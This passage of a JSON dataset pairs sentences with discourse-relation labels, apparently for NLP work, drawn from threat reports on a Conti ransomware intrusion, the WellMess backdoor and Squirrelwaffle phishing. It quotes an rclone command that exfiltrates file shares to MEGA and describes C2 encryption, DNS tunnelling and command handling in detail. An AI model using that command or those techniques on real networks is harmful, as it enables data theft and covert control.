        "S2": "We observed that the DLL payload \u201cD574.dll\u201d had issues contacting the domain volga.azureedge[.]net and C2 server via DNS 9003 response codes.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We observed that the DLL payload \u201cD574.dll\u201d had issues contacting the domain volga.azureedge[.]net and C2 server via DNS 9003 response codes.",
        "S2": "External sandboxes show the domain tied to other Cobalt Strike beacon samples not associated with this report, it is likely the server was taken down by this time.",
        "relation": "ELABORATION"
    },
    {
        "S1": "External sandboxes show the domain tied to other Cobalt Strike beacon samples not associated with this report, it is likely the server was taken down by this time.",
        "S2": "D8B3.dll illustrates initial activity, followed by established network connectivity to 82.117.252[.]143:80.",
        "relation": "MISC"
    },
    {
        "S1": "D8B3.dll illustrates initial activity, followed by established network connectivity to 82.117.252[.]143:80.",
        "S2": "D8B3.dll was the Cobalt Strike beacon the attackers used throughout the intrusion.",
        "relation": "ELABORATION"
    },
    {
        "S1": "D8B3.dll was the Cobalt Strike beacon the attackers used throughout the intrusion.",
        "S2": "It was the main payload to facilitate the bulk of the initial intrusion and ongoing activities to maintain access.",
        "relation": "ELABORATION"
    },
    {
        "S1": "It was the main payload to facilitate the bulk of the initial intrusion and ongoing activities to maintain access.",
        "S2": "The DLL 143.dll used in lateral movement from the beachhead host to the backup server also communicated to this Cobalt Strike server.",
        "relation": "MISC"
    },
    {
        "S1": "The DLL 143.dll used in lateral movement from the beachhead host to the backup server also communicated to this Cobalt Strike server.",
        "S2": "Once the attackers gained a foothold and pivoted laterally, they were able to switch to using RDP and access specific hosts of interest.",
        "relation": "NEXT"
    },
    {
        "S1": "Once the attackers gained a foothold and pivoted laterally, they were able to switch to using RDP and access specific hosts of interest.",
        "S2": "Once the attackers established access to critical assets, they used RClone to exfiltrate sensitive data to a cloud storage space named MEGA.",
        "relation": "NEXT"
    },
    {
        "S1": "Once the attackers established access to critical assets, they used RClone to exfiltrate sensitive data to a cloud storage space named MEGA.",
        "S2": "The full command used by Rclone includes a variety of parameters, including setting the bandwidth limit.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The full command used by Rclone includes a variety of parameters, including setting the bandwidth limit.",
        "S2": "rclone.exe  copy --max-age 2y \"\\\\SERVER\\Shares\" Mega:DATA -q --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M",
        "relation": "ELABORATION"
    },
    {
        "S1": "rclone.exe  copy --max-age 2y \"\\\\SERVER\\Shares\" Mega:DATA -q --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M",
        "S2": "The use of RClone continues to be an effective tool for bulk data exfiltration.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The use of RClone continues to be an effective tool for bulk data exfiltration.",
        "S2": "NCC Group has provided a detailed write-up of the Rclone application and detection methods.",
        "relation": "ELABORATION"
    },
    {
        "S1": "NCC Group has provided a detailed write-up of the Rclone application and detection methods.",
        "S2": "The Rclone activity was observed on two separate instances, each lasting around three hours and occurring between 1900 and 2200 UTC.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The Rclone activity was observed on two separate instances, each lasting around three hours and occurring between 1900 and 2200 UTC.",
        "S2": "On the fifth day, the threat actors moved to their final actions to encrypt the domain.",
        "relation": "MISC"
    },
    {
        "S1": "On the fifth day, the threat actors moved to their final actions to encrypt the domain.",
        "S2": "They first pinged systems across the network via an interactive command shell.",
        "relation": "ELABORATION"
    },
    {
        "S1": "They first pinged systems across the network via an interactive command shell.",
        "S2": "Iobit unlocker was also dropped during this phase but we did not see it used.",
        "relation": "NEXT"
    },
    {
        "S1": "Iobit unlocker was also dropped during this phase but we did not see it used.",
        "S2": "After pinging systems, the threat actors opened a batch file that was ultimately used to launch the Conti ransomware.",
        "relation": "NEXT"
    },
    {
        "S1": "After pinging systems, the threat actors opened a batch file that was ultimately used to launch the Conti ransomware.",
        "S2": "The locker.bat is a bespoke script designed to encrypt files across a number of hosts:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The locker.bat is a bespoke script designed to encrypt files across a number of hosts:",
        "S2": "Based on the contents of the file we can assess that the actors were likely making last minute adjustments before executing the ransomware based on the ping results.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Based on the contents of the file we can assess that the actors were likely making last minute adjustments before executing the ransomware based on the ping results.",
        "S2": "The ransom was then launched via the backup server.",
        "relation": "NEXT"
    },
    {
        "S1": "The ransom was then launched via the backup server.",
        "S2": "To encrypt systems the ransomware mounted the C$ dir for each target host and then performed its encryption routine.",
        "relation": "ELABORATION"
    },
    {
        "S1": "To encrypt systems the ransomware mounted the C$ dir for each target host and then performed its encryption routine.",
        "S2": "Here\u2019s an overview of the execution:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Here\u2019s an overview of the execution:",
        "S2": "Analysis of the DLLs accompanying the EXE indicates Conti artifacts:",
        "relation": "MISC"
    },
    {
        "S1": "Analysis of the DLLs accompanying the EXE indicates Conti artifacts:",
        "S2": "Once the encryption was completed, the following ransomware note dropped in all affected directories as \u2018readme.txt\u2019",
        "relation": "MISC"
    },
    {
        "S1": "Once the encryption was completed, the following ransomware note dropped in all affected directories as \u2018readme.txt\u2019",
        "S2": "The content of these text files:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The content of these text files:",
        "S2": "Following the execution of the locker ransomware, the attacker then conducted a file listing discovery against multiple hosts \u2013 likely to validate and assess that the locker encryption was successful:",
        "relation": "MISC"
    },
    {
        "S1": "The WellMess sample we examine in this insight is written in Go, though .NET WellMess samples also exist.",
        "S2": "The Go malware comes in 32-bit and 64-bit variants as both ELF and PE files, allowing the threat actor to develop the malware once and deploy it to many different architectures.",
        "relation": "MISC"
    },
    {
        "S1": "The Go malware comes in 32-bit and 64-bit variants as both ELF and PE files, allowing the threat actor to develop the malware once and deploy it to many different architectures.",
        "S2": "The most recent samples of WellMess differ from the 2018 samples as they now support communicating with the C2 server via three separate communication methods.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The most recent samples of WellMess differ from the 2018 samples as they now support communicating with the C2 server via three separate communication methods.",
        "S2": "The sample analysed in this report is typical of the latest generation of WellMess.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The sample analysed in this report is typical of the latest generation of WellMess.",
        "S2": "The malware builds a pipe-separated userParameters string based on the victim machine\u2019s computer name, user domain, user name and several hardcoded values in the malware, and stores it for use throughout the malware\u2019s execution.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The malware builds a pipe-separated userParameters string based on the victim machine\u2019s computer name, user domain, user name and several hardcoded values in the malware, and stores it for use throughout the malware\u2019s execution.",
        "S2": "An example string would be:",
        "relation": "ELABORATION"
    },
    {
        "S1": "An example string would be:",
        "S2": "The bold values are taken from data hardcoded in the binary and likely represent campaign or platform information about the running malware.",
        "relation": "MISC"
    },
    {
        "S1": "The bold values are taken from data hardcoded in the binary and likely represent campaign or platform information about the running malware.",
        "S2": "In this sample a copy of the string then has the NTSUUpIIaFEU string appended for a second time and then MD5 hashed which is stored for later use.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In this sample a copy of the string then has the NTSUUpIIaFEU string appended for a second time and then MD5 hashed which is stored for later use.",
        "S2": "As mentioned, the malware can communicate with the C2 server via three communication methods with each being enabled or disabled on a per sample basis.",
        "relation": "MISC"
    },
    {
        "S1": "As mentioned, the malware can communicate with the C2 server via three communication methods with each being enabled or disabled on a per sample basis.",
        "S2": "The three methods are: HTTP, HTTPS, DNS",
        "relation": "ELABORATION"
    },
    {
        "S1": "The three methods are: HTTP, HTTPS, DNS",
        "S2": "In this sample the DNS communication method is not enabled; however, the method has been documented for completeness as the functionality is present in the malware.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In this sample the DNS communication method is not enabled; however, the method has been documented for completeness as the functionality is present in the malware.",
        "S2": "For each communication method the malware follows a similar process; it establishes a connection with the C2 and then enters an infinite loop to exchange data.",
        "relation": "ELABORATION"
    },
    {
        "S1": "For each communication method the malware follows a similar process; it establishes a connection with the C2 and then enters an infinite loop to exchange data.",
        "S2": "The details of the initial connection differ for each method but the main loop that exchanges data uses the same functions to carry out malicious functionality.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The details of the initial connection differ for each method but the main loop that exchanges data uses the same functions to carry out malicious functionality.",
        "S2": "The HTTP mode is the same communication method used in variants of the malware from 2018.",
        "relation": "MISC"
    },
    {
        "S1": "The HTTP mode is the same communication method used in variants of the malware from 2018.",
        "S2": "Although it uses the non-encrypted HTTP protocol to communicate with the C2 it manually encrypts the contents of the requests to hide data from packet inspection.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Although it uses the non-encrypted HTTP protocol to communicate with the C2 it manually encrypts the contents of the requests to hide data from packet inspection.",
        "S2": "The malware creates an AES session key and initial value (as detailed in Appendix C) which are base64 encoded, appended to each other with a \\n separator.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The malware creates an AES session key and initial value (as detailed in Appendix C) which are base64 encoded, appended to each other with a \\n separator.",
        "S2": "Once appended, it is further encrypted with a hardcoded RSA public key and base64 encoded again and obfuscated before being sent to the C2 as the body of a POST request.",
        "relation": "NEXT"
    },
    {
        "S1": "Once appended, it is further encrypted with a hardcoded RSA public key and base64 encoded again and obfuscated before being sent to the C2 as the body of a POST request.",
        "S2": "The obfuscation routine used on the final base64 data removes and replaces characters in the base64 string, according to Table 1:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The obfuscation routine used on the final base64 data removes and replaces characters in the base64 string, according to Table 1:",
        "S2": "The string is then chopped into randomly chosen 3-8 character chunks and each chunk is separated with a single space.",
        "relation": "NEXT"
    },
    {
        "S1": "The string is then chopped into randomly chosen 3-8 character chunks and each chunk is separated with a single space.",
        "S2": "The final string is then set as the content of a HTTP POST request to the hardcoded IP and port present in the malware.",
        "relation": "NEXT"
    },
    {
        "S1": "The final string is then set as the content of a HTTP POST request to the hardcoded IP and port present in the malware.",
        "S2": "The POST request also creates an obfuscated cookie to include in the POST request.",
        "relation": "NEXT"
    },
    {
        "S1": "The POST request also creates an obfuscated cookie to include in the POST request.",
        "S2": "The cookie is a string consisting of tags that contain information about the malware which is then RC6 encrypted with a hardcoded key, base64 encoded and split into random sized chunks.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The cookie is a string consisting of tags that contain information about the malware which is then RC6 encrypted with a hardcoded key, base64 encoded and split into random sized chunks.",
        "S2": "The first cookie sent to the C2 includes the previously generated MD5 session hash and has the following format before encryption:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The first cookie sent to the C2 includes the previously generated MD5 session hash and has the following format before encryption:",
        "S2": "Encrypted cookies generated by the malware can be decrypted with a script[3] provided by JPCERT, so long as the RC6 key has been obtained for the sample that generated the cookie.",
        "relation": "NEXT"
    },
    {
        "S1": "Encrypted cookies generated by the malware can be decrypted with a script[3] provided by JPCERT, so long as the RC6 key has been obtained for the sample that generated the cookie.",
        "S2": "Once the AES key and IV have been sent to the C2 the malware sends the userParameters string and the saved MD5 hash separated by a newline character in the same way.",
        "relation": "NEXT"
    },
    {
        "S1": "Once the AES key and IV have been sent to the C2 the malware sends the userParameters string and the saved MD5 hash separated by a newline character in the same way.",
        "S2": "The only difference from the previous send is that the <;title;> tag contains the string a:1_1 this time.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The only difference from the previous send is that the <;title;> tag contains the string a:1_1 this time.",
        "S2": "After the initial connection to the C2 has been established, the malware will repeatedly attempt to receive a command from the C2.",
        "relation": "MISC"
    },
    {
        "S1": "After the initial connection to the C2 has been established, the malware will repeatedly attempt to receive a command from the C2.",
        "S2": "The communications follow the pattern shown in Figure 2.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The communications follow the pattern shown in Figure 2.",
        "S2": "The 2398 random bytes of data are base64 encoded and then obfuscated as detailed previously in Table 1.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The 2398 random bytes of data are base64 encoded and then obfuscated as detailed previously in Table 1.",
        "S2": "This data is then sent to the C2 with an RC6 encrypted cookie with the <;head;> tag containing the MD5 session hash value, the <;title;> tag containing the string rc and the <;service;> tag being present but empty.",
        "relation": "NEXT"
    },
    {
        "S1": "This data is then sent to the C2 with an RC6 encrypted cookie with the <;head;> tag containing the MD5 session hash value, the <;title;> tag containing the string rc and the <;service;> tag being present but empty.",
        "S2": "The malware expects the server to respond with a HTTP 200 OK response that contains an RC6 encrypted cookie in a similar format to the sent cookie.",
        "relation": "NEXT"
    },
    {
        "S1": "The malware expects the server to respond with a HTTP 200 OK response that contains an RC6 encrypted cookie in a similar format to the sent cookie.",
        "S2": "This is checked in the malware by parsing the received cookie data according to the following regex which also matches the format of the sent cookie data.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This is checked in the malware by parsing the received cookie data according to the following regex which also matches the format of the sent cookie data.",
        "S2": "The cookie is used by the malware to determine what type of command has been received from the C2; Table 2 summarises the possible options.",
        "relation": "NEXT"
    },
    {
        "S1": "The cookie is used by the malware to determine what type of command has been received from the C2; Table 2 summarises the possible options.",
        "S2": "If the response from the C2 contains a value of p in the service tag received, then the malware will generate a new AES key and send it to the C2 in the same way as during the initial connection to the C2.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If the response from the C2 contains a value of p in the service tag received, then the malware will generate a new AES key and send it to the C2 in the same way as during the initial connection to the C2.",
        "S2": "A value of G in the head tag will make the malware send the string \u201cMissed me? Interval=\u201d with the currently configured value that is used by the malware to calculate wait intervals when receiving this command.",
        "relation": "ELABORATION"
    },
    {
        "S1": "A value of G in the head tag will make the malware send the string \u201cMissed me? Interval=\u201d with the currently configured value that is used by the malware to calculate wait intervals when receiving this command.",
        "S2": "A value of C in the head tag will check a <;title;> tag for the number of chunks the C2 wants to send to the malware and will receive data and store it for later use until the title tag value in a received message matches the desired number of chunks from the C2.",
        "relation": "ELABORATION"
    },
    {
        "S1": "A value of C in the head tag will check a <;title;> tag for the number of chunks the C2 wants to send to the malware and will receive data and store it for later use until the title tag value in a received message matches the desired number of chunks from the C2.",
        "S2": "This method will be used when the C2 wishes to send a large amount of data to the malware but does not want to alert network monitoring tools that a large data transfer is occurring.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This method will be used when the C2 wishes to send a large amount of data to the malware but does not want to alert network monitoring tools that a large data transfer is occurring.",
        "S2": "The service tag values, except for p, are used when interpreting the content of the data sent to the malware.",
        "relation": "NEXT"
    },
    {
        "S1": "The service tag values, except for p, are used when interpreting the content of the data sent to the malware.",
        "S2": "The content of the data is stored in the Content segment of the 200 OK responses from the C2.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The content of the data is stored in the Content segment of the 200 OK responses from the C2.",
        "S2": "The data in the content section is converted from the obfuscated format detailed in Table 1, base64 decoded and then decrypted using the AES key that was previously sent to the C2.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The data in the content section is converted from the obfuscated format detailed in Table 1, base64 decoded and then decrypted using the AES key that was previously sent to the C2.",
        "S2": "Once all the data has been received and decoded from the C2, the malware will call a function called botlib.Work which is responsible for the malicious behaviour of this malware.",
        "relation": "NEXT"
    },
    {
        "S1": "Once all the data has been received and decoded from the C2, the malware will call a function called botlib.Work which is responsible for the malicious behaviour of this malware.",
        "S2": "This function handles the u, m, hi, fu, fd and pr service tags as well as having a default case where the service tag does not contain any data.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This function handles the u, m, hi, fu, fd and pr service tags as well as having a default case where the service tag does not contain any data.",
        "S2": "The fu commands take the contents of the response from the C2 as the file to write and parses the service tag for the file name and path to use.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The fu commands take the contents of the response from the C2 as the file to write and parses the service tag for the file name and path to use.",
        "S2": "The service tag is expected to be in the following format:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The service tag is expected to be in the following format:",
        "S2": "The tag is split using the \u2018|\u2019 character and if the filepath parameter is present, then the data is written to a file using that parameter as the file name and path.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The tag is split using the \u2018|\u2019 character and if the filepath parameter is present, then the data is written to a file using that parameter as the file name and path.",
        "S2": "If the path is not present, then the malware instead writes the file to the current directory the malware is in with a file name of upload.filename.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If the path is not present, then the malware instead writes the file to the current directory the malware is in with a file name of upload.filename.",
        "S2": "The fd command uses the same format to find the file to send to the C2; however, if the filepath parameter is not present the malware will look for a file in the current folder called download.filename.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The fd command uses the same format to find the file to send to the C2; however, if the filepath parameter is not present the malware will look for a file in the current folder called download.filename.",
        "S2": "The pr command also utilises the \u2018|\u2019 as a separator with each protocol separated by the symbol.",
        "relation": "MISC"
    },
    {
        "S1": "The pr command also utilises the \u2018|\u2019 as a separator with each protocol separated by the symbol.",
        "S2": "An example service tag that would enable all of the communication methods in the sample analysed would be:",
        "relation": "ELABORATION"
    },
    {
        "S1": "An example service tag that would enable all of the communication methods in the sample analysed would be:",
        "S2": "The default case when the service tag is empty allows the malware to treat the contents of the response from the C2 as a command to execute via the Go library functions os.exec.Command or os.exec.Start.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The default case when the service tag is empty allows the malware to treat the contents of the response from the C2 as a command to execute via the Go library functions os.exec.Command or os.exec.Start.",
        "S2": "The format of the received command is checked against the below regex pattern for validity before executing and the command is read from the body of the message received from the C2.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The format of the received command is checked against the below regex pattern for validity before executing and the command is read from the body of the message received from the C2.",
        "S2": "This method for running commands is slightly different from the older .NET variants of the backdoor which additionally supported running scripts via PowerShell.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This method for running commands is slightly different from the older .NET variants of the backdoor which additionally supported running scripts via PowerShell.",
        "S2": "When the backdoor is configured to use HTTPS to communicate with the C2, the functionality is largely the same as when in HTTP mode.",
        "relation": "MISC"
    },
    {
        "S1": "When the backdoor is configured to use HTTPS to communicate with the C2, the functionality is largely the same as when in HTTP mode.",
        "S2": "The differences are that it lacks the options to update a session key due to encryption being handled by the TLS layer and it also does not have the option to send data to and from the C2 in the chunking mode previously described.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The differences are that it lacks the options to update a session key due to encryption being handled by the TLS layer and it also does not have the option to send data to and from the C2 in the chunking mode previously described.",
        "S2": "In addition, only one transmission is made to the C2 when the malware is establishing a connection as there is no exchange of an AES session key.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In addition, only one transmission is made to the C2 when the malware is establishing a connection as there is no exchange of an AES session key.",
        "S2": "The hello message that is sent contains the same plaintext data as the HTTP mode.",
        "relation": "NEXT"
    },
    {
        "S1": "The hello message that is sent contains the same plaintext data as the HTTP mode.",
        "S2": "However, the title tag has just the character a rather than a:1_1 that is used for the HTTP beacon.",
        "relation": "ELABORATION"
    },
    {
        "S1": "However, the title tag has just the character a rather than a:1_1 that is used for the HTTP beacon.",
        "S2": "The communication pattern between the victim and the C2 also follows the same pattern as described in Figure 2 but the outer layers of obfuscating the data and RSA encryption are removed due to the TLS protocol handling the encryption.",
        "relation": "MISC"
    },
    {
        "S1": "The communication pattern between the victim and the C2 also follows the same pattern as described in Figure 2 but the outer layers of obfuscating the data and RSA encryption are removed due to the TLS protocol handling the encryption.",
        "S2": "The malware secures the communications between itself and the C2 by implementing a feature called mutual TLS.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The malware secures the communications between itself and the C2 by implementing a feature called mutual TLS.",
        "S2": "Usually TLS operates in simple mode, which only requires a server to carry out authentication.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Usually TLS operates in simple mode, which only requires a server to carry out authentication.",
        "S2": "Mutual TLS means the malware has a trusted SSL certificate hardcoded in its binary that it uses to check the certificate provided by the C2; the malware also forwards its own hardcoded certificate to the C2 that the C2 checks.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Mutual TLS means the malware has a trusted SSL certificate hardcoded in its binary that it uses to check the certificate provided by the C2; the malware also forwards its own hardcoded certificate to the C2 that the C2 checks.",
        "S2": "So long as both the C2 and the malware accept the provided certificates then communications will be encrypted using TLS, otherwise the connection will be rejected and the malware will not be able to communicate with the C2.",
        "relation": "ELABORATION"
    },
    {
        "S1": "So long as both the C2 and the malware accept the provided certificates then communications will be encrypted using TLS, otherwise the connection will be rejected and the malware will not be able to communicate with the C2.",
        "S2": "When looking at the certificates embedded in the samples, it appears that the threat actor uses a self-signed certificate authority to sign both the C2 and the malware\u2019s certificates.",
        "relation": "ELABORATION"
    },
    {
        "S1": "When looking at the certificates embedded in the samples, it appears that the threat actor uses a self-signed certificate authority to sign both the C2 and the malware\u2019s certificates.",
        "S2": "The WellMess malware stores the C2 IP addresses it uses in the binary as a plaintext url.",
        "relation": "MISC"
    },
    {
        "S1": "The WellMess malware stores the C2 IP addresses it uses in the binary as a plaintext url.",
        "S2": "The format of the C2 url string for the example in Figure 3 would be one of:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The format of the C2 url string for the example in Figure 3 would be one of:",
        "S2": "This pattern can be used to identify numerous samples of the WellMess backdoor.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This pattern can be used to identify numerous samples of the WellMess backdoor.",
        "S2": "The DNS communication protocol is significantly different to the previous two modes.",
        "relation": "MISC"
    },
    {
        "S1": "The DNS communication protocol is significantly different to the previous two modes.",
        "S2": "Data is sent to the C2 by DNS tunnelling.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Data is sent to the C2 by DNS tunnelling.",
        "S2": "This involves prepending encoded data as a sub domain to a threat actor-controlled domain and then using DNS requests to transmit this data to the C2 with other DNS resolution services forwarding on the message.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This involves prepending encoded data as a sub domain to a threat actor-controlled domain and then using DNS requests to transmit this data to the C2 with other DNS resolution services forwarding on the message.",
        "S2": "The implementation of DNS tunnelling in this sample uses A records to send data to the C2 and then uses TXT records to receive commands during its main loop.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The implementation of DNS tunnelling in this sample uses A records to send data to the C2 and then uses TXT records to receive commands during its main loop.",
        "S2": "The initial message sent to the C2 consists of the current time printed in DD/MM/YYYY HH:MM:SS AM/PM format.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The initial message sent to the C2 consists of the current time printed in DD/MM/YYYY HH:MM:SS AM/PM format.",
        "S2": "This is then encoded using a non-standard base32 encoding with an alphabet of ybndrfg8ejkmcpqxot1uwisza345h769.",
        "relation": "NEXT"
    },
    {
        "S1": "This is then encoded using a non-standard base32 encoding with an alphabet of ybndrfg8ejkmcpqxot1uwisza345h769.",
        "S2": "This time value is then used throughout the execution of the malware as part of the DNS beacon message to the C2.",
        "relation": "NEXT"
    },
    {
        "S1": "This time value is then used throughout the execution of the malware as part of the DNS beacon message to the C2.",
        "S2": "The DNS method builds a URL string by splitting the encoded string into four parts of random length, separating each with a period.",
        "relation": "NEXT"
    },
    {
        "S1": "The DNS method builds a URL string by splitting the encoded string into four parts of random length, separating each with a period.",
        "S2": "It then gzips and RC4 encrypts the previously generated MD5 hash string using a hardcoded key.",
        "relation": "NEXT"
    },
    {
        "S1": "It then gzips and RC4 encrypts the previously generated MD5 hash string using a hardcoded key.",
        "S2": "As this sample did not have DNS functionality enabled, the key was not configured in this binary.",
        "relation": "ELABORATION"
    },
    {
        "S1": "As this sample did not have DNS functionality enabled, the key was not configured in this binary.",
        "S2": "The result of the RC4 operation is then encoded using the base32 encoding and then that is split into a period-separated string with each chunk a random length.",
        "relation": "MISC"
    },
    {
        "S1": "The result of the RC4 operation is then encoded using the base32 encoding and then that is split into a period-separated string with each chunk a random length.",
        "S2": "If the result of the manipulation of the MD5 hash gave the string abcdefg12345, the resulting period separated string could end up being something like .ab.cde.fg12.245.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If the result of the manipulation of the MD5 hash gave the string abcdefg12345, the resulting period separated string could end up being something like .ab.cde.fg12.245.",
        "S2": "Each chunk can have a maximum length of 12 characters.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Each chunk can have a maximum length of 12 characters.",
        "S2": "The previously encoded four-part message then has the command of this operation appended to it, in the initial beacon\u2019s case the command is id.",
        "relation": "MISC"
    },
    {
        "S1": "The previously encoded four-part message then has the command of this operation appended to it, in the initial beacon\u2019s case the command is id.",
        "S2": "That then has the MD5 string appended to it followed by the malicious domain.",
        "relation": "NEXT"
    },
    {
        "S1": "That then has the MD5 string appended to it followed by the malicious domain.",
        "S2": "The whole message is then prepended with a sequence identifier in case the malware needs more than one DNS request to fit the information in.",
        "relation": "NEXT"
    },
    {
        "S1": "The whole message is then prepended with a sequence identifier in case the malware needs more than one DNS request to fit the information in.",
        "S2": "A couple of example strings with sections bolded to show the boundaries are included below to demonstrate the encoding:",
        "relation": "ELABORATION"
    },
    {
        "S1": "A couple of example strings with sections bolded to show the boundaries are included below to demonstrate the encoding:",
        "S2": "As can be seen in the above examples, even when the contents of the message change, the part of the URL relating to the MD5 hash remains consistent albeit with different length chunks for each send.",
        "relation": "ELABORATION"
    },
    {
        "S1": "As can be seen in the above examples, even when the contents of the message change, the part of the URL relating to the MD5 hash remains consistent albeit with different length chunks for each send.",
        "S2": "When sending beacons during the main loop in DNS mode the malware will generate two base64 encoded strings from seven random bytes each and join them with a period to the command rc.",
        "relation": "ELABORATION"
    },
    {
        "S1": "When sending beacons during the main loop in DNS mode the malware will generate two base64 encoded strings from seven random bytes each and join them with a period to the command rc.",
        "S2": "It will then append the previously generated time string after separating it into four separate chunks.",
        "relation": "NEXT"
    },
    {
        "S1": "It will then append the previously generated time string after separating it into four separate chunks.",
        "S2": "Finally, it will append another 10 base64 encoded strings, each generated from 7 random bytes.",
        "relation": "NEXT"
    },
    {
        "S1": "Finally, it will append another 10 base64 encoded strings, each generated from 7 random bytes.",
        "S2": "Finally the C2 domain is appended to the string and this is sent to the C2 as a DNS TXT request.",
        "relation": "NEXT"
    },
    {
        "S1": "Finally the C2 domain is appended to the string and this is sent to the C2 as a DNS TXT request.",
        "S2": "The response is expected to contain three TXT records.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The response is expected to contain three TXT records.",
        "S2": "The first specifies the command that is being sent from the C2 and can be either of C or G.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The first specifies the command that is being sent from the C2 and can be either of C or G.",
        "S2": "These commands operate in the same way described previously.",
        "relation": "ELABORATION"
    },
    {
        "S1": "These commands operate in the same way described previously.",
        "S2": "If the first command does not match either of these values then the malware reads the data from the third TXT record, decodes it using the custom base32 algorithm, RC4 decrypts the result, then gzip decompresses the data to give the final data to be used.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If the first command does not match either of these values then the malware reads the data from the third TXT record, decodes it using the custom base32 algorithm, RC4 decrypts the result, then gzip decompresses the data to give the final data to be used.",
        "S2": "The commands expected in this data are either the pr command, as previously described, or a com command.",
        "relation": "NEXT"
    },
    {
        "S1": "The commands expected in this data are either the pr command, as previously described, or a com command.",
        "S2": "The com option calls the same functions as the default case in the HTTP and HTTPS modes which allows the malware to run a cmd shell but then exfiltrates the output via DNS A records.",
        "relation": "NEXT"
    },
    {
        "S1": "Squirrelwaffle campaigns generally start via spam emails that attempt to convince victims to click an embedded URL using a technique known as email thread hijacking.",
        "S2": "Email thread hijacking leverages emails that have been stolen prior to the attack and later repurposed to dupe a victim into believing that an email is from someone that they know who is replying to the same thread.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Email thread hijacking leverages emails that have been stolen prior to the attack and later repurposed to dupe a victim into believing that an email is from someone that they know who is replying to the same thread.",
        "S2": "Once a victim clicks on the URL, a ZIP file is downloaded that contains a Microsoft Word document.",
        "relation": "NEXT"
    },
    {
        "S1": "Once a victim clicks on the URL, a ZIP file is downloaded that contains a Microsoft Word document.",
        "S2": "These documents follow a similar naming convention matching the regular expression diagram-\\d{2,3}.doc.",
        "relation": "ELABORATION"
    },
    {
        "S1": "These documents follow a similar naming convention matching the regular expression diagram-\\d{2,3}.doc.",
        "S2": "For example, the file with an MD5 hash E599A656599A2680C9392C7329D9D519 has the filename diagram-346.doc.",
        "relation": "ELABORATION"
    },
    {
        "S1": "For example, the file with an MD5 hash E599A656599A2680C9392C7329D9D519 has the filename diagram-346.doc.",
        "S2": "This document is using a DocuSign template lure that instructs the user to enable a macro to view the content (as shown in Figure 2).",
        "relation": "ELABORATION"
    },
    {
        "S1": "This document is using a DocuSign template lure that instructs the user to enable a macro to view the content (as shown in Figure 2).",
        "S2": "All the other documents analyzed by Zscaler ThreatLabz have exactly the same content with multiple modules that contain VBA code.",
        "relation": "ELABORATION"
    },
    {
        "S1": "All the other documents analyzed by Zscaler ThreatLabz have exactly the same content with multiple modules that contain VBA code.",
        "S2": "Once the user enables the macro, an AutoOpen() subroutine is called which then executes a malicious Visual Basic Application (VBA) macro.",
        "relation": "MISC"
    },
    {
        "S1": "Once the user enables the macro, an AutoOpen() subroutine is called which then executes a malicious Visual Basic Application (VBA) macro.",
        "S2": "Here, the AutoOpen() subroutine calls another function efile() in the bxh module.",
        "relation": "NEXT"
    },
    {
        "S1": "Here, the AutoOpen() subroutine calls another function efile() in the bxh module.",
        "S2": "There is a UserForm object in the document which contains a VBS file named pin.vbs that is embedded in the caption of the DocuSign image.",
        "relation": "MISC"
    },
    {
        "S1": "There is a UserForm object in the document which contains a VBS file named pin.vbs that is embedded in the caption of the DocuSign image.",
        "S2": "The document that contains the macro code leverages cscript.exe to extract the embedded VBS file, which is written to the %ProgramData% folder, and executed using wscript.exe.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The document that contains the macro code leverages cscript.exe to extract the embedded VBS file, which is written to the %ProgramData% folder, and executed using wscript.exe.",
        "S2": "This VBS file contains an obfuscated PowerShell script with 5 different URLs to download the Squirrelwaffle payload as shown in Figure 3.",
        "relation": "NEXT"
    },
    {
